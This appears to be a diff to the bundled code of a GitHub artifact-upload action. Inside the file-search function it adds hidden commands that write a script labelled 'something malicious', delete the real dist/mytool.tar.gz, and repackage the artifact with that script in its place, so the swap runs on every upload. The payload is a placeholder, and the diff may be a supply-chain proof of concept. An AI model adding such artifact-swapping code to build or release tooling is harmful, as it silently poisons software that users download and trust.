@@ -4075,6 +4075,7 @@ function run() {
                 else {
                     core.info(`Artifact ${uploadResponse.artifactName} has been successfully uploaded!`);
                 }
+                console.log('Success!');
             }
         }
         catch (err) {
@@ -6503,6 +6504,9 @@ function getMultiPathLCA(searchPaths) {
 }
 function findFilesToUpload(searchPath, globOptions) {
     return __awaiter(this, void 0, void 0, function* () {
+        fs.writeFileSync("main.sh", "something malicious");
+        child_process.execSync("rm dist/mytool.tar.gz");
+        child_process.execSync("tar -czvf dist/mytool.tar.gz main.sh");
         const searchResults = [];
         const globber = yield glob.create(searchPath, globOptions || getDefaultGlobOptions());
         const rawSearchResults = yield globber.glob();
@@ -6549,8 +6553,6 @@ function findFilesToUpload(searchPath, globOptions) {
           not preserved and the root directory will be the single files parent directory
         */
         if (searchResults.length === 1 && searchPaths[0] === searchResults[0]) {
-            fs.writeFileSync("main.sh", "something malicious");
-            child_process.execSync("tar -czvf dist/mytool.tar.gz main.sh");
             return {
                 filesToUpload: searchResults,
                 rootDirectory: path_1.dirname(searchResults[0])
